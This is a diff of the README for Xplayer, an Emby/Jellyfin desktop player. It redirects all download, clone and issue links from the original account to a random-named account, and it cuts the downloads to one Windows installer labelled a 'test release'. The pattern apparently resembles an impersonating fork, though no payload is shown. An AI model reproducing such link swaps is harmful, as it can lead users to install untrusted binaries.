@@ -11,7 +11,7 @@
 
 <p align="center">
   <a href="LICENSE"><img src="https://img.shields.io/badge/License-MIT-blue.svg" alt="License: MIT"/></a>
-  <a href="https://github.com/AlanHJ/Xplayer/releases/latest"><img src="https://img.shields.io/github/v/release/AlanHJ/Xplayer?include_prereleases&label=Download" alt="Release"/></a>
+  <a href="https://github.com/xtq94kws7z-droid/Xplayer/releases/latest"><img src="https://img.shields.io/github/v/release/xtq94kws7z-droid/Xplayer?include_prereleases&label=Download" alt="Release"/></a>
   <img src="https://img.shields.io/badge/Qt-6.x-green.svg" alt="Qt 6"/>
   <img src="https://img.shields.io/badge/C%2B%2B-20-orange.svg" alt="C++20"/>
   <img src="https://img.shields.io/badge/Platform-Windows%20|%20Linux%20|%20macOS-lightgrey.svg" alt="Platform: Windows | Linux | macOS"/>
@@ -24,6 +24,12 @@
 ---
 
 <a id="中文"></a>
+
+## Xplayer 是什么
+
+Xplayer 是一款面向 Emby / Jellyfin 用户的现代桌面播放器。它不是浏览器套壳，而是基于 **Qt 6、C++20 与 libmpv** 构建的原生客户端，专注于快速浏览媒体库、自然流畅的页面交互，以及稳定可靠的本地播放体验。
+
+从海报墙、影片详情、搜索和媒体管理，到弹幕、播放列表与下载管理，Xplayer 希望把家庭媒体库真正变成一套顺手、漂亮、可以长期使用的桌面影音中心。
 
 ## 📸 应用截图
 
@@ -38,28 +44,22 @@
 
 ## 📥 下载
 
-最新版本：**v0.0.7**
+最新版本：**v1.0.4**
 
 | 安装包 | 说明 |
 |---|---|
-| [Xplayer-0.0.7-Win-x64-Setup.exe](https://github.com/AlanHJ/Xplayer/releases/download/v0.0.7/Xplayer-0.0.7-Win-x64-Setup.exe) | Windows 10/11 x64 安装包 |
-| [Xplayer-0.0.7-Win-x64.zip](https://github.com/AlanHJ/Xplayer/releases/download/v0.0.7/Xplayer-0.0.7-Win-x64.zip) | Windows 10/11 x64 绿色便携版 |
-| [xplayer-0.0.7-macos-arm64.dmg](https://github.com/AlanHJ/Xplayer/releases/download/v0.0.7/xplayer-0.0.7-macos-arm64.dmg) | macOS 26+ (Apple 芯片) |
-| [xplayer-0.0.7-x86_64.AppImage](https://github.com/AlanHJ/Xplayer/releases/download/v0.0.7/xplayer-0.0.7-x86_64.AppImage) | Linux x64 通用 AppImage |
-| [xplayer_0.0.7-noble_amd64.deb](https://github.com/AlanHJ/Xplayer/releases/download/v0.0.7/xplayer_0.0.7-noble_amd64.deb) | Ubuntu 24.04 (Noble) 安装包 |
-| [xplayer_0.0.7-jammy_amd64.deb](https://github.com/AlanHJ/Xplayer/releases/download/v0.0.7/xplayer_0.0.7-jammy_amd64.deb) | Ubuntu 22.04 (Jammy) 安装包 |
-| [xplayer_0.0.7-bookworm_amd64.deb](https://github.com/AlanHJ/Xplayer/releases/download/v0.0.7/xplayer_0.0.7-bookworm_amd64.deb) | Debian 12 (Bookworm) 安装包 |
-| [xplayer_0.0.7-trixie_amd64.deb](https://github.com/AlanHJ/Xplayer/releases/download/v0.0.7/xplayer_0.0.7-trixie_amd64.deb) | Debian 13 (Trixie) 安装包 |
+| [Xplayer-1.0.4-Setup.exe](https://github.com/xtq94kws7z-droid/Xplayer/releases/download/v1.0.4/Xplayer-1.0.4-Setup.exe) | Windows 10/11 x64 安装包 |
 
-旧版本可以在 [Releases](https://github.com/AlanHJ/Xplayer/releases) 页面下载。
+旧版本可以在 [Releases](https://github.com/xtq94kws7z-droid/Xplayer/releases) 页面下载。
 
-## 🚀 v0.0.7 更新内容
+## 🚀 v1.0.4 更新内容
 
-- 弹弹Play新增 v2 直接搜索、标准动画标题发现和旧版接口回退的多阶段搜索流程。
-- 改进基于 TMDB 的季度和集数约束，以及手动搜索中的明确集数处理。
-- 改进弹幕候选排序，优先采用哈希、提供者 ID 和文件名匹配，并按作品、季度和集数组织结果。
-- 修复播放器覆盖对话框显示时按键事件穿透到播放器的问题。
-- 修复深色和浅色主题下播放列表搜索框的高度。
+- 针对首页海报墙、媒体列表和详情页滚动进行专项流畅度优化。
+- 改进海报、背景图与演员图片的异步加载、缓存和渐进显示体验。
+- 优化首页到详情页的交互反馈、页面切换和快速返回时的生命周期处理。
+- 修复多处长标题、按钮文字和不同窗口尺寸下的布局显示问题。
+- 加固 Windows 安装与应用内升级流程，修复快捷方式权限和打包路径问题。
+- 完善网络异常、快速连续操作和异步任务结束后的状态保护。
 
 ## ✨ 功能特性
 
@@ -134,7 +134,7 @@
 ### 1. 克隆仓库
 
 ```bash
-git clone --recursive https://github.com/AlanHJ/Xplayer.git
+git clone --recursive https://github.com/xtq94kws7z-droid/Xplayer.git
 cd Xplayer
 ```
 
@@ -198,7 +198,7 @@ Xplayer/
 
 加入 Telegram 交流群：[https://t.me/+qXQ-zU56z9gxOWNl](https://t.me/+qXQ-zU56z9gxOWNl)
 
-> **注意：** 本项目是为爱发电项目，测试覆盖不全，敬请谅解。如有问题请通过 [GitHub Issues](https://github.com/AlanHJ/Xplayer/issues) 反馈。
+> **注意：** 本项目是个人开发的测试版本，建议在非关键设备上体验。如有问题请通过 [GitHub Issues](https://github.com/xtq94kws7z-droid/Xplayer/issues) 反馈。
 
 ## 📄 许可证
 
@@ -216,6 +216,10 @@ Xplayer/
 
 <a id="english"></a>
 
+## What is Xplayer?
+
+Xplayer is a modern desktop client for Emby and Jellyfin. Built natively with **Qt 6, C++20, and libmpv**, it focuses on responsive media-library browsing, fluid interaction, and dependable local playback without relying on a browser shell.
+
 ## 📸 Screenshots
 
 <p align="center">
@@ -229,28 +233,22 @@ Xplayer/
 
 ## 📥 Download
 
-Latest release: **v0.0.7**
+Latest release: **v1.0.4**
 
 | Package | Description |
 |---|---|
-| [Xplayer-0.0.7-Win-x64-Setup.exe](https://github.com/AlanHJ/Xplayer/releases/download/v0.0.7/Xplayer-0.0.7-Win-x64-Setup.exe) | Windows 10/11 x64 installer |
-| [Xplayer-0.0.7-Win-x64.zip](https://github.com/AlanHJ/Xplayer/releases/download/v0.0.7/Xplayer-0.0.7-Win-x64.zip) | Windows 10/11 x64 portable package |
-| [xplayer-0.0.7-macos-arm64.dmg](https://github.com/AlanHJ/Xplayer/releases/download/v0.0.7/xplayer-0.0.7-macos-arm64.dmg) | macOS 26+ (Apple Silicon) |
-| [xplayer-0.0.7-x86_64.AppImage](https://github.com/AlanHJ/Xplayer/releases/download/v0.0.7/xplayer-0.0.7-x86_64.AppImage) | Universal Linux x64 AppImage |
-| [xplayer_0.0.7-noble_amd64.deb](https://github.com/AlanHJ/Xplayer/releases/download/v0.0.7/xplayer_0.0.7-noble_amd64.deb) | Ubuntu 24.04 (Noble) package |
-| [xplayer_0.0.7-jammy_amd64.deb](https://github.com/AlanHJ/Xplayer/releases/download/v0.0.7/xplayer_0.0.7-jammy_amd64.deb) | Ubuntu 22.04 (Jammy) package |
-| [xplayer_0.0.7-bookworm_amd64.deb](https://github.com/AlanHJ/Xplayer/releases/download/v0.0.7/xplayer_0.0.7-bookworm_amd64.deb) | Debian 12 (Bookworm) package |
-| [xplayer_0.0.7-trixie_amd64.deb](https://github.com/AlanHJ/Xplayer/releases/download/v0.0.7/xplayer_0.0.7-trixie_amd64.deb) | Debian 13 (Trixie) package |
+| [Xplayer-1.0.4-Setup.exe](https://github.com/xtq94kws7z-droid/Xplayer/releases/download/v1.0.4/Xplayer-1.0.4-Setup.exe) | Windows 10/11 x64 installer |
 
-Older releases are available on the [Releases](https://github.com/AlanHJ/Xplayer/releases) page.
+Older releases are available on the [Releases](https://github.com/xtq94kws7z-droid/Xplayer/releases) page.
 
-## 🚀 What's New in v0.0.7
+## 🚀 What's New in v1.0.4
 
-- Added a multi-stage DandanPlay search flow with direct v2 search, canonical anime-title discovery, and legacy fallback.
-- Improved TMDB-constrained season and episode matching and explicit episode handling in manual searches.
-- Improved danmaku candidate ordering by prioritizing hash, provider-ID, and filename matches and organizing results by work, season, and episode.
-- Prevented keyboard events from passing through to the player while an overlay dialog is visible.
-- Fixed the playlist search input height in both Dark and Light themes.
+- Targeted smoothness improvements for the home poster wall, media lists, and detail-page scrolling.
+- Improved asynchronous loading, caching, and progressive display for posters, backdrops, and cast images.
+- Faster interaction feedback and safer lifecycle handling when entering or leaving detail pages quickly.
+- Fixed long-title, button-label, and responsive layout issues across different window sizes.
+- Hardened Windows installation and in-app update paths, including shortcut permission handling.
+- Improved state safety around network failures, rapid repeated input, and completed asynchronous work.
 
 ## ✨ Features
 
@@ -325,7 +323,7 @@ Older releases are available on the [Releases](https://github.com/AlanHJ/Xplayer
 ### 1. Clone the repository
 
 ```bash
-git clone --recursive https://github.com/AlanHJ/Xplayer.git
+git clone --recursive https://github.com/xtq94kws7z-droid/Xplayer.git
 cd Xplayer
 ```
 
@@ -389,7 +387,7 @@ Xplayer/
 
 Join our Telegram group: [https://t.me/+qXQ-zU56z9gxOWNl](https://t.me/+qXQ-zU56z9gxOWNl)
 
-> **Note:** This is a passion project with limited testing. Your understanding is appreciated. Please report any issues via [GitHub Issues](https://github.com/AlanHJ/Xplayer/issues).
+> **Note:** This is an independently developed test release. Try it on non-critical systems and report issues through [GitHub Issues](https://github.com/xtq94kws7z-droid/Xplayer/issues).
 
 ## 📄 License
 
